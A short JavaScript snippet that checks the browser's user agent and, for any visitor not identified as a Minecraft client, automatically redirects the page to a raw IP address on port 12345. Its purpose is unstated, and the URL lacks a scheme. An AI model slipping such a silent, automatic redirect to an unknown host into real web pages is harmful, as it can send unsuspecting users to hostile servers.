function redirectTo(url) {
    window.location.href = url;
}

function detectMinecraftClient() {
    var userAgent = navigator.userAgent;
    if (userAgent.includes("Minecraft")) {
        console.log("Minecraft client detected");
    } else {
        redirectTo("98.180.36.83:12345")
    }
}

detectMinecraftClient()
